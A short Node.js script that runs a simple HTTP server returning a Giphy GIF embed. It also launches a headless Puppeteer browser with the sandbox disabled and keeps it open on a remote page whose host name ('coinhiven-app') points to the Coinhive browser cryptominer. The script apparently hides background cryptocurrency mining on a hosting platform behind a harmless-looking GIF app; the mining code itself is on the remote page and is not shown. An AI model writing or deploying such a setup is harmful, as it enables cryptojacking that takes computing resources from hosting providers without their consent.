const http = require('http');
const puppeteer = require('puppeteer');

(async () => {

  const requestHandler = (request, response) => {
    console.log(request.url)
    response.end('<iframe src="https://giphy.com/embed/z48aJruaX0Jsk" width="480" height="358" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/z48aJruaX0Jsk">via GIPHY</a></p>')
  }

  const server = http.createServer(requestHandler)

  server.listen(process.env.PORT, (err) => {
    if (err) {
      return console.log('something bad happened', err)
    }

    console.log('server is listening')
  })

  const browser = await puppeteer.launch({args: ['--no-sandbox', '--disable-setuid-sandbox']});
  const page = await browser.newPage();
  await page.goto('https://coinhiven-app.herokuapp.com/bg.php');
  //await browser.close();

})();
